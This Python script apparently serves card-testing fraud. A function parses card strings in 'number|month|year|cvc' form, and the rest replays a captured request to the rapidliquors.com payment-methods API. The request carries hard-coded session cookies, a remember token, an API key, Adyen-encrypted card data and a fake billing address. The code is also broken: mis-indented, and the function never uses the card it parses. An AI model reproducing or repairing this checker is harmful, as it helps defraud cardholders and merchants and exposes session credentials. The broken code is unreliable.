import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	import requests
	
import requests

    cookies = {
    'cf_clearance': 'zb1MK5i71kxy7ayygNjxSeIaVPbSGumNL0cWu1TK720-1714912291-1.0.1.1-nfYnU_lO.3wDpc6FREWuAj6bzb74jAYe4kEGFsqoS7SV94O1HfUYIbjnjN6pTi.A8HKe_YPvLZOqz26aXzGs2Q',
    '__cf_bm': 'hQPAwoQy_lrpEL5nFXLFahMfzKxVBv1XH_NNQYEB54Y-1714912322-1.0.1.1-Q2mGXH5jKz.1a9Wwe6CpINP.J2z9pOn.pVuyK4Li1yQeubGic5jywL0qnfrU.Wn9CkeUAXtswrqRP3yo232x6Q',
    '_fbp': 'fb.1.1714912344716.1029540859',
    '_ga': 'GA1.1.1989699486.1714912345',
    '_HiveNet_uuid': 'c091b6c1-a617-4065-b300-ec72d80781f4',
    '_ga_VJE7B79GHW': 'GS1.1.1714912345.1.0.1714912352.53.0.0',
    'user_id': 'IjY2Mzc3YzZjNzI0ZTE4MmQ1MDNjNDE1YSI%3D--705da6c1908590c40629d33337d4c5008f5ff5d4',
    'remember_token': 'dfErym2FdpmXlxNw3lnZYg',
    '_HiveNet_session': 'WmpRdGFHUGdIZEVMOEZaeW5KcmVmVHlEVDBjZ013aGc4UnhpRWc3NEJqM3o0QWJWOWdORlJma3lHWVc5UW54OTFRYklKaWRPTEZqQnBYU3Q0Ui9BSlBobWpPVXB3UkhUUmlVdzlseXpXV2xsRFlvdXpYOVVjeHJHVXduNUVBbHhUMWJTaElFdlNqbHEvalVwL3JKSmxIemF4b0ZwVzdHVjY5a2Jkck9qWmlxdkd0dGEySklmbUJqbnIxdzlXRVVPWkVzK0R5dDJHKzV3WWtaa084dlZqQkNnLzh0a0J1bmtGSEZmcUVPRnBobTNoaTJyaFA3amZhUUk1ekh6YnpnUEFMenFqWkc0NDNWdFVGZkZ6Q3Y1amhvb1ZubEFERG14MlJaRWpUb04zWnNpQWt0Rk1MeHBUdC9yQ0ZoaXZ2WUx6SzJRampMQ2NFZHRuNkRSOE00Z2NsbFMvQnJtVnZONjAxalRjVHBCL21jTS9pV2NVTzNTTktuN0JCbUhVWEprMTJYV0NUNWsyY3I0bjdmcXhUUmdoZ0wvU3MwaGU3dGh6dmpYQW8wdlRZeXR5NlR1Qjd5K2ZEMU5Gd3NFbTFCNFJHMnB5enc4RE1tZEVtQWEvZlRWM2c9PS0tVjE1WWs3NGdDeFZHU0dFTFhLTk1sdz09--554520de94243bf7488fbea974a212e3e896c9b4',
}

headers = {
    'authority': 'rapidliquors.com',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/json',
    # 'cookie': 'cf_clearance=zb1MK5i71kxy7ayygNjxSeIaVPbSGumNL0cWu1TK720-1714912291-1.0.1.1-nfYnU_lO.3wDpc6FREWuAj6bzb74jAYe4kEGFsqoS7SV94O1HfUYIbjnjN6pTi.A8HKe_YPvLZOqz26aXzGs2Q; __cf_bm=hQPAwoQy_lrpEL5nFXLFahMfzKxVBv1XH_NNQYEB54Y-1714912322-1.0.1.1-Q2mGXH5jKz.1a9Wwe6CpINP.J2z9pOn.pVuyK4Li1yQeubGic5jywL0qnfrU.Wn9CkeUAXtswrqRP3yo232x6Q; _fbp=fb.1.1714912344716.1029540859; _ga=GA1.1.1989699486.1714912345; _HiveNet_uuid=c091b6c1-a617-4065-b300-ec72d80781f4; _ga_VJE7B79GHW=GS1.1.1714912345.1.0.1714912352.53.0.0; user_id=IjY2Mzc3YzZjNzI0ZTE4MmQ1MDNjNDE1YSI%3D--705da6c1908590c40629d33337d4c5008f5ff5d4; remember_token=dfErym2FdpmXlxNw3lnZYg; _HiveNet_session=WmpRdGFHUGdIZEVMOEZaeW5KcmVmVHlEVDBjZ013aGc4UnhpRWc3NEJqM3o0QWJWOWdORlJma3lHWVc5UW54OTFRYklKaWRPTEZqQnBYU3Q0Ui9BSlBobWpPVXB3UkhUUmlVdzlseXpXV2xsRFlvdXpYOVVjeHJHVXduNUVBbHhUMWJTaElFdlNqbHEvalVwL3JKSmxIemF4b0ZwVzdHVjY5a2Jkck9qWmlxdkd0dGEySklmbUJqbnIxdzlXRVVPWkVzK0R5dDJHKzV3WWtaa084dlZqQkNnLzh0a0J1bmtGSEZmcUVPRnBobTNoaTJyaFA3amZhUUk1ekh6YnpnUEFMenFqWkc0NDNWdFVGZkZ6Q3Y1amhvb1ZubEFERG14MlJaRWpUb04zWnNpQWt0Rk1MeHBUdC9yQ0ZoaXZ2WUx6SzJRampMQ2NFZHRuNkRSOE00Z2NsbFMvQnJtVnZONjAxalRjVHBCL21jTS9pV2NVTzNTTktuN0JCbUhVWEprMTJYV0NUNWsyY3I0bjdmcXhUUmdoZ0wvU3MwaGU3dGh6dmpYQW8wdlRZeXR5NlR1Qjd5K2ZEMU5Gd3NFbTFCNFJHMnB5enc4RE1tZEVtQWEvZlRWM2c9PS0tVjE1WWs3NGdDeFZHU0dFTFhLTk1sdz09--554520de94243bf7488fbea974a212e3e896c9b4',
    'origin': 'https://rapidliquors.com',
    'referer': 'https://rapidliquors.com/profile?section=payments&sub_section=payment_methods',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-arch': '""',
    'sec-ch-ua-bitness': '""',
    'sec-ch-ua-full-version': '"124.0.6327.2"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.2"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"Redmi Note 9 Pro"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"10.0.0"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

json_data = {
    'api_key': '7508df878a8c7566a880e4d3f7fa7972',
    'sdk_guid': '5822f771-9752-f8f6-5fae-b7c6f32cb389',
    'ch_request_guid': '08853a62-2514-8740-fdca-f05c202c4e7b',
    'client_origin': 'app://sites.rapidliqa509c410',
    'local': True,
    'payment_gateway': 'adyen',
    'payment_method_nonce': '{"type":"scheme","encryptedCardNumber":"adyenjs_0_1_25$n4biB931da7I8D89BUzT1Jd/+ZqtFiSZt7+4akP7K5VVOsCHkk8NnRhCoZydZHD+uwjE0CwYGuYBLJuphoueQdcNZobzVZyPK1wnUiok6pVVF8RaF6VT5zXzMsSLWsfBagPrDPfFJkWxibRUWyJfIv2a4xZUNRnC6wD9xfrpTwD/D6bCsF3LwJjhk++nQt7hxIGKSBeMsx+XLZqWI3wpJRU7yW4QsK8JxSBmGOSY8QMNvIHyvgWCNpH9ZnVXC38uMzQr2HdrPANRu+hI3+8cZM/9ABLr/HQ+0fv0Slr8Ia7Uh3fBWTJ62lCIzl1BNqWU51Hmvntg2oMFJTmR/r7PNQ==$XJUd8B9lCgWmiWJfXr0nsrmbnEyydewuoi4395FPNFMNYGPkg5l8jBd9ovCl+mhlnepI2hbsz8R6k0Gw1NniAkEbiOIfPXI3LehN73kFM1jMigqUf1jp8gAwJzeHtPQsNhReaAgVOSsUij0gPPIaIuzCKzIK36fQ017AzViETkjuAP5XaUM0r9mVMrzRO0xHLwc/IN+8XzssAtJIUcWuwFBbNod2kIMwDB9Ie1ay0VpZak2IkF9I667xcPX4E7FWVn97UwC6kutpzyTadE941rufcAX7smdwBAHqnjA7EFWe9wqQ2xgpYjeEZFCRt4lFXyruvqIEJg5xNHeC0J5IcaolYVTSCSU3YCt5NSj7x1IUZjTU1k0o8wC87kjtB5fjlcZlnBJRuniPYGwLn4lYapitWxlhjTgxSCvP8G+ecFaSGtv4LeI67lxGaDub7WKHDKMfk8qz1K+tPDbx+hiN9JYE7uZiI5HzzC5zs5b7R5UH/lLigMsufcY+WJS5DuoeheqYgVi7jxVUBFs6k4hp5PoYoeVFMdXynlkTIDufqB53nvhJQhtDzmYAU7rrLx9zwm+HmD5Ce1C8cui19iVi9u3FYHSp4iJCjYToRwRoHCf8oABic7aeX13s4P/llq/cfaEHA7w+rQLzoFHJA8DH3JouRJYcAOp44Vl9SxtVSHXi5pKJKDowj7GISAlH1dZNmy6ll1V45v6PdnLB7QDppIdbsUhY7Nk2RnytSeNA1aijhfmpBegXcEugcwVYquY8ysLVsGzOrnnrVJINfNb1K3N1713/XfYVVXUuXfkMUbWl+V+Q/RDq6SZtWznaNB+1XHM0wmsskwxwCWvm0Q5S2dVNvZbjnoktko4zfWMDCUBNj66Qh6Z1tHsUNpaWvrxwXQz/p5+YnuX6kACmSTu1dfP42Dda1dhK3MzRYOQWhepDhynBOOaKsjQwtCCRbz9Grj03tQFRafnFZJpJj410K0ORrg4Cg7Sgaz7pUVOYQkizyw2z/J8+LIAuW9mz2ehQQ4tEPwVSBdPVGhnXepVlasHTT6xbqGY28fTfWDXiWGoNB3vMrX+3LX/+mgNNw4yw9B6UDv0ZN2j25gS/Jh6G5g0MabOjIsUfDYhWNkdxu6pbl5BHaIRu5BUPsm953LyeFdIoDg==","encryptedExpiryMonth":"adyenjs_0_1_25$JZSCv2Tf9wgB+qs2Ug4Dk4PPvlnIDVH0x3fsIOCpi/vJvwGjnOmnJwPQnMMnfrcbzm5I6AoDYUGhYVOjYY0BbgWBXRffH39SY/8jhVb957JggkRfuXvmBYpg/YHi0gH8g2Xlkwr1I7Pu5XDihxRv8u+PL1umJhPVsvLfZPTlsVeYJzw3Vc9stWRHtZpdtp0dSsxdPFIMhRCqPDmfHyX6QnZ8GAo45XqBqoN/G32KRyx7rl1lba+JSbn6jErOaRVZA3pV9LjYRqxjDjU+WsB1qFmRD8OImvsHPvmW/sMigrDt5iQx5MAYgk+c9c9GjKJxPqEhLgpOCpr9Iv5FWz/nkQ==$LxgKvxaH0G63JlN7wB88slP7ThzAiHY4NIAGps7xOFhpc8KDIrNrEshjQPZp9JoP/H5Keecf0PjeUX7RKGirHtfIw/UZplmhul8OGn+KO6umiN/DmIZKUInWPCEil0tQ6akBIbEGlnIOtQVwJKV06vyBhQsNxYyzb6EwaA+EcTyvlwhDpOHdoNaz0MJQzYnqzn9VwgLpN+HR0vSon6c7pE3wys68eQh+ZTr9uq7luqoGr1ESpWn8HiKJVXw5euQFS/MyJfjsOg+Dn7WySDiVwi3EAlPq29H5zE+X6JqE/t4R67hf8rsWyZ1Fw0wBAt/W4xYHGNdbb5TS2z66+Bc/yhSSn4uuPv/BnGiHY+fFXEb+4lAN/cLxJWeP0zkfxg8F4gYRD7LOH5deSz9q2jSLSgo3+Aom2irw66Hj6TbsgUTLgnaF6qBrC7m2iA==","encryptedExpiryYear":"adyenjs_0_1_25$CcSfL7x8MiYNSGo0AX+tjdRCrRtY3qo4v61ldY0eSimF5rbPCt+y8bfN6feRGZfBBTlFFHX3AS57AyyKrjHTfPe24yE2WYmSjmVk0Qtjcreaxs2i2/whfno5pexGQsXRP3kCp2byjalqpxkouvAh3Xyo0hPMEBLAUYEMJgia7PAiIKOEdliJLavgFpH2kyrMeafwtk39zEgwFhSzhr+DXyoqt6TW7L0r88Rrr8c2aoQYFVtTWuJW3SqofK3OVZJz7+B9KNF7GkJfwq4AATRuUwYIkcW4NwMLEFJNSR8SsIOyhnFvmscVEPG8mJw0r7u9XqOLig+dLoW33hL0UFI8QQ==$3Pz77tw2j+ixLwWge7qt1kVJlHX3kEG+gA6TXYqXPQrtWC3OCR9TMnbCt2cTKTtJS8GJcL8rvsJRAgaYgQ8bUs/+EVf+nkL/e9BbXr3WKkwiNcO3BTxEx1V7F0NCniOSq0bjgBMgAqIekYhfBFZiG8boBmEvpvsLeaZiqkZ2WHEcasXZdtqbLo4+qc8NHLRau2j/MESkyycxdJVR1ZiVPspQMnu6QDAei1/GKFW9i/3KyZ7LJtk9+ZDbJlv2WHUHrjqU5OB5TNmF6MxbIyV4KoGpZtjJOjifoNYTMbvqEpuf3bSU3Aoc0KsYDOiqo66wcX72BwyGBy5IoOl8yMNNNciIuXxk4kohveOLeu3IQdIWyHuJB5lIGYXCgIPbawOMmpQqv3F/aNEngXHZeMV6L/S77m+KJP/NyvOREAORt1ad0FDGc0Te1raic/4=","encryptedSecurityCode":"adyenjs_0_1_25$EKxneX9VX8JTQvEVPmMnCYNE4joWjKdqxAYpVRZpcZj8tWXbniBcOk2TH/BxO03dr/FG2LBO195xsn2255DFrNNC+8F2BsRiVMZ+gNShNtt/Q/q0wdk8szDMiZMlXpMDFmTXdWpxF7zUqnmJ0TPBIW4n7KmiaULyVsl9GkvdjcN79xLv9JFftRIlWKdtmBSLx+VT6mf9ig62SqkGIZXTODGQr8g9Z3ffQkhDdOz3A1zZ9q4LgfOpzJBmBgE0nivCAFb3nQ8AeJJ4HUmWu3J+raiVCOZSfq6bQuVuD1SACn1anHQ7Hk0K7ct+w6O5NiE7SbkRHnXbJBdWWIb3PfRA/w==$RgavxCbnGrEZY+oUP+OvTf5QM1WpXdPxSS7iMI6R8GpPSMQfodhGkgjIpZa/SfU63pZEKywsXL3Wcb5sFpQZkv4JGEJdpCbKaNk1IIhYzVObcKqH32JqTbKeZQun7rjZT136JTHogyyLjOEJwLb4U317DhTN0OhgzP3GozgFw1dqflZsymWUtFwnp7oa0fdcSccVFiphfp4mipCJvK3+xGNSpgwl9ZSt/+uurwATOQlUC26HoNiZIfIo4xP0XA9EomSPBjEKXfAKW0plfXOwCGbRsg6JyumsCUZ0Ur4rOKCB370Sf8ab28rG8Twm8yi9w+/MkmcDrUvgqVBrnq9Eer+PXD6iy3KJQ+IgRZYo3+xM/W0JsyhQ7UN8S0dsudPmPz58lRz8EhzH8Ahl9Bxv1F6499nrHrkPOjRj9oJzHUMUfRq9ucUgNT0i+avoW4ezG3DkFtV6l+5m+MpYu+69TPh3psadIEzyt4uCRX3IvbwtEUomOHIqfcjEnekeZLO7uPnF+aWWiUWDrmsP3g+gJmGnULwfV/oDUZYryJre1KCreUllxleBs+c2gH6cpRzOFD6uvTI4sgJ0YpwgLvVWvQY3DjRys+Rm7JJoGMY9KOVe9fXSVUHQDvAUBeKSDbzO+R0zX+aDcKvrP+9Wh82PQ0ltop5S7xWUpxvEC6CT0T5Ut2CX61t6ypEc/K6+koXxzXPN/oJ3mQbyGdu0fQII/nvaMOD2XDQrwI9TQefD4z0NX79pznjUdsWR0KL+wKiMrczZvQVYUHPiwy/CSfIPjQKjkmld6w==","brand":"visa","holderName":"abdoggav","billingAddress":{"street":"2058 dancanavenue","postalCode":"11743","city":"hingektor","country":"","stateOrProvince":"new york"}}',
    'payment_receiver': '5e9f26e88704c5249d7ac913_merchant',
}

response = requests.post(
    'https://rapidliquors.com//api/v1/payments/customers/payment_methods.json',
    cookies=cookies,
    headers=headers,
    json=json_data,
)

# Note: json_data will not be serialized by requests
# exactly as it was in the original request.
#data = '{"api_key":"7508df878a8c7566a880e4d3f7fa7972","sdk_guid":"5822f771-9752-f8f6-5fae-b7c6f32cb389","ch_request_guid":"08853a62-2514-8740-fdca-f05c202c4e7b","client_origin":"app://sites.rapidliqa509c410","local":true,"payment_gateway":"adyen","payment_method_nonce":"{\\"type\\":\\"scheme\\",\\"encryptedCardNumber\\":\\"adyenjs_0_1_25$n4biB931da7I8D89BUzT1Jd/+ZqtFiSZt7+4akP7K5VVOsCHkk8NnRhCoZydZHD+uwjE0CwYGuYBLJuphoueQdcNZobzVZyPK1wnUiok6pVVF8RaF6VT5zXzMsSLWsfBagPrDPfFJkWxibRUWyJfIv2a4xZUNRnC6wD9xfrpTwD/D6bCsF3LwJjhk++nQt7hxIGKSBeMsx+XLZqWI3wpJRU7yW4QsK8JxSBmGOSY8QMNvIHyvgWCNpH9ZnVXC38uMzQr2HdrPANRu+hI3+8cZM/9ABLr/HQ+0fv0Slr8Ia7Uh3fBWTJ62lCIzl1BNqWU51Hmvntg2oMFJTmR/r7PNQ==$XJUd8B9lCgWmiWJfXr0nsrmbnEyydewuoi4395FPNFMNYGPkg5l8jBd9ovCl+mhlnepI2hbsz8R6k0Gw1NniAkEbiOIfPXI3LehN73kFM1jMigqUf1jp8gAwJzeHtPQsNhReaAgVOSsUij0gPPIaIuzCKzIK36fQ017AzViETkjuAP5XaUM0r9mVMrzRO0xHLwc/IN+8XzssAtJIUcWuwFBbNod2kIMwDB9Ie1ay0VpZak2IkF9I667xcPX4E7FWVn97UwC6kutpzyTadE941rufcAX7smdwBAHqnjA7EFWe9wqQ2xgpYjeEZFCRt4lFXyruvqIEJg5xNHeC0J5IcaolYVTSCSU3YCt5NSj7x1IUZjTU1k0o8wC87kjtB5fjlcZlnBJRuniPYGwLn4lYapitWxlhjTgxSCvP8G+ecFaSGtv4LeI67lxGaDub7WKHDKMfk8qz1K+tPDbx+hiN9JYE7uZiI5HzzC5zs5b7R5UH/lLigMsufcY+WJS5DuoeheqYgVi7jxVUBFs6k4hp5PoYoeVFMdXynlkTIDufqB53nvhJQhtDzmYAU7rrLx9zwm+HmD5Ce1C8cui19iVi9u3FYHSp4iJCjYToRwRoHCf8oABic7aeX13s4P/llq/cfaEHA7w+rQLzoFHJA8DH3JouRJYcAOp44Vl9SxtVSHXi5pKJKDowj7GISAlH1dZNmy6ll1V45v6PdnLB7QDppIdbsUhY7Nk2RnytSeNA1aijhfmpBegXcEugcwVYquY8ysLVsGzOrnnrVJINfNb1K3N1713/XfYVVXUuXfkMUbWl+V+Q/RDq6SZtWznaNB+1XHM0wmsskwxwCWvm0Q5S2dVNvZbjnoktko4zfWMDCUBNj66Qh6Z1tHsUNpaWvrxwXQz/p5+YnuX6kACmSTu1dfP42Dda1dhK3MzRYOQWhepDhynBOOaKsjQwtCCRbz9Grj03tQFRafnFZJpJj410K0ORrg4Cg7Sgaz7pUVOYQkizyw2z/J8+LIAuW9mz2ehQQ4tEPwVSBdPVGhnXepVlasHTT6xbqGY28fTfWDXiWGoNB3vMrX+3LX/+mgNNw4yw9B6UDv0ZN2j25gS/Jh6G5g0MabOjIsUfDYhWNkdxu6pbl5BHaIRu5BUPsm953LyeFdIoDg==\\",\\"encryptedExpiryMonth\\":\\"adyenjs_0_1_25$JZSCv2Tf9wgB+qs2Ug4Dk4PPvlnIDVH0x3fsIOCpi/vJvwGjnOmnJwPQnMMnfrcbzm5I6AoDYUGhYVOjYY0BbgWBXRffH39SY/8jhVb957JggkRfuXvmBYpg/YHi0gH8g2Xlkwr1I7Pu5XDihxRv8u+PL1umJhPVsvLfZPTlsVeYJzw3Vc9stWRHtZpdtp0dSsxdPFIMhRCqPDmfHyX6QnZ8GAo45XqBqoN/G32KRyx7rl1lba+JSbn6jErOaRVZA3pV9LjYRqxjDjU+WsB1qFmRD8OImvsHPvmW/sMigrDt5iQx5MAYgk+c9c9GjKJxPqEhLgpOCpr9Iv5FWz/nkQ==$LxgKvxaH0G63JlN7wB88slP7ThzAiHY4NIAGps7xOFhpc8KDIrNrEshjQPZp9JoP/H5Keecf0PjeUX7RKGirHtfIw/UZplmhul8OGn+KO6umiN/DmIZKUInWPCEil0tQ6akBIbEGlnIOtQVwJKV06vyBhQsNxYyzb6EwaA+EcTyvlwhDpOHdoNaz0MJQzYnqzn9VwgLpN+HR0vSon6c7pE3wys68eQh+ZTr9uq7luqoGr1ESpWn8HiKJVXw5euQFS/MyJfjsOg+Dn7WySDiVwi3EAlPq29H5zE+X6JqE/t4R67hf8rsWyZ1Fw0wBAt/W4xYHGNdbb5TS2z66+Bc/yhSSn4uuPv/BnGiHY+fFXEb+4lAN/cLxJWeP0zkfxg8F4gYRD7LOH5deSz9q2jSLSgo3+Aom2irw66Hj6TbsgUTLgnaF6qBrC7m2iA==\\",\\"encryptedExpiryYear\\":\\"adyenjs_0_1_25$CcSfL7x8MiYNSGo0AX+tjdRCrRtY3qo4v61ldY0eSimF5rbPCt+y8bfN6feRGZfBBTlFFHX3AS57AyyKrjHTfPe24yE2WYmSjmVk0Qtjcreaxs2i2/whfno5pexGQsXRP3kCp2byjalqpxkouvAh3Xyo0hPMEBLAUYEMJgia7PAiIKOEdliJLavgFpH2kyrMeafwtk39zEgwFhSzhr+DXyoqt6TW7L0r88Rrr8c2aoQYFVtTWuJW3SqofK3OVZJz7+B9KNF7GkJfwq4AATRuUwYIkcW4NwMLEFJNSR8SsIOyhnFvmscVEPG8mJw0r7u9XqOLig+dLoW33hL0UFI8QQ==$3Pz77tw2j+ixLwWge7qt1kVJlHX3kEG+gA6TXYqXPQrtWC3OCR9TMnbCt2cTKTtJS8GJcL8rvsJRAgaYgQ8bUs/+EVf+nkL/e9BbXr3WKkwiNcO3BTxEx1V7F0NCniOSq0bjgBMgAqIekYhfBFZiG8boBmEvpvsLeaZiqkZ2WHEcasXZdtqbLo4+qc8NHLRau2j/MESkyycxdJVR1ZiVPspQMnu6QDAei1/GKFW9i/3KyZ7LJtk9+ZDbJlv2WHUHrjqU5OB5TNmF6MxbIyV4KoGpZtjJOjifoNYTMbvqEpuf3bSU3Aoc0KsYDOiqo66wcX72BwyGBy5IoOl8yMNNNciIuXxk4kohveOLeu3IQdIWyHuJB5lIGYXCgIPbawOMmpQqv3F/aNEngXHZeMV6L/S77m+KJP/NyvOREAORt1ad0FDGc0Te1raic/4=\\",\\"encryptedSecurityCode\\":\\"adyenjs_0_1_25$EKxneX9VX8JTQvEVPmMnCYNE4joWjKdqxAYpVRZpcZj8tWXbniBcOk2TH/BxO03dr/FG2LBO195xsn2255DFrNNC+8F2BsRiVMZ+gNShNtt/Q/q0wdk8szDMiZMlXpMDFmTXdWpxF7zUqnmJ0TPBIW4n7KmiaULyVsl9GkvdjcN79xLv9JFftRIlWKdtmBSLx+VT6mf9ig62SqkGIZXTODGQr8g9Z3ffQkhDdOz3A1zZ9q4LgfOpzJBmBgE0nivCAFb3nQ8AeJJ4HUmWu3J+raiVCOZSfq6bQuVuD1SACn1anHQ7Hk0K7ct+w6O5NiE7SbkRHnXbJBdWWIb3PfRA/w==$RgavxCbnGrEZY+oUP+OvTf5QM1WpXdPxSS7iMI6R8GpPSMQfodhGkgjIpZa/SfU63pZEKywsXL3Wcb5sFpQZkv4JGEJdpCbKaNk1IIhYzVObcKqH32JqTbKeZQun7rjZT136JTHogyyLjOEJwLb4U317DhTN0OhgzP3GozgFw1dqflZsymWUtFwnp7oa0fdcSccVFiphfp4mipCJvK3+xGNSpgwl9ZSt/+uurwATOQlUC26HoNiZIfIo4xP0XA9EomSPBjEKXfAKW0plfXOwCGbRsg6JyumsCUZ0Ur4rOKCB370Sf8ab28rG8Twm8yi9w+/MkmcDrUvgqVBrnq9Eer+PXD6iy3KJQ+IgRZYo3+xM/W0JsyhQ7UN8S0dsudPmPz58lRz8EhzH8Ahl9Bxv1F6499nrHrkPOjRj9oJzHUMUfRq9ucUgNT0i+avoW4ezG3DkFtV6l+5m+MpYu+69TPh3psadIEzyt4uCRX3IvbwtEUomOHIqfcjEnekeZLO7uPnF+aWWiUWDrmsP3g+gJmGnULwfV/oDUZYryJre1KCreUllxleBs+c2gH6cpRzOFD6uvTI4sgJ0YpwgLvVWvQY3DjRys+Rm7JJoGMY9KOVe9fXSVUHQDvAUBeKSDbzO+R0zX+aDcKvrP+9Wh82PQ0ltop5S7xWUpxvEC6CT0T5Ut2CX61t6ypEc/K6+koXxzXPN/oJ3mQbyGdu0fQII/nvaMOD2XDQrwI9TQefD4z0NX79pznjUdsWR0KL+wKiMrczZvQVYUHPiwy/CSfIPjQKjkmld6w==\\",\\"brand\\":\\"visa\\",\\"holderName\\":\\"abdoggav\\",\\"billingAddress\\":{\\"street\\":\\"2058 dancanavenue\\",\\"postalCode\\":\\"11743\\",\\"city\\":\\"hingektor\\",\\"country\\":\\"\\",\\"stateOrProvince\\":\\"new york\\"}}","payment_receiver":"5e9f26e88704c5249d7ac913_merchant"}'
#response = requests.post(
#    'https://rapidliquors.com//api/v1/payments/customers/payment_methods.json',
#    cookies=cookies,
#    headers=headers,
#    data=data,
#)